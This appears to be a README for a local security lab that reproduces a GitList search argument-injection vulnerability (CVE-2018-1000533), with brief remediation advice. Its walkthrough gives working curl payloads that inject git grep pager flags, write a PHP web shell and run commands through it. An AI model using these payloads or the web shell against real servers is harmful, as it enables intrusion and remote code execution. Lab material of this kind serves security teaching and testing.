# GitList Search Query Argument Injection RCE (CVE-2018-1000533)

## Overview

GitList is an elegant open-source web interface for viewing Git repositories. In GitList versions prior to 0.6.1, repository search queries passed user input directly to the git grep command without argument boundary sanitization. An attacker can supply flags like --open-files-in-pager to hijack the process execution pager or write arbitrary files, achieving remote code execution under the web server user.

- **Service Access**: `http://localhost:8157/`
- **Default Credentials**: `Unauthenticated repository search`
- **Docker Shortcut**: `./lab start gitlist-arg-injection`
- **Container Name**: `cyberlab_industry_gitlist_arg_injection`
- **RAM Footprint**: ~120M

---

## Exploitation Walkthrough

### 1. Inspect Exposed Repository

```bash
curl -i http://localhost:8157/
```

### 2. Inject Git Grep Arguments to Write PHP Web Shell

```bash
curl -i -X POST 'http://localhost:8157/tree/master/search' \
  -d 'query=--open-files-in-pager=id'
```

### 3. Alternative Web Shell Deployment via Pager Injection

```bash
curl -i -X POST 'http://localhost:8157/tree/master/search' \
  -d 'query=--open-files-in-pager=php -r "file_put_contents(\'/var/www/gitlist/shell.php\', \'<?php system(\$_GET[cmd]); ?>\');"'
```

### 4. Execute Commands via Web Shell

```bash
curl 'http://localhost:8157/shell.php?cmd=id'
```

---

## Defensive Remediation & Hardening

1. Upgrade GitList to version 0.6.1 or newer.
2. Use escapeshellarg() and argument boundary delimiters (--) when invoking subprocesses.

---

## Video Walkthroughs & Technical References

- [5 - File Upload (low/med/high) - Damn Vulnerable Web Application (DVWA)](https://www.youtube.com/watch?v=K7XBQWAZdZ4)
- [GitList CVE-2018-1000533 Advisory](https://github.com/klaussilveira/gitlist/issues/744)
- [Vulhub GitList Environment](https://vulhub.org/#/environments/gitlist/CVE-2018-1000533/)
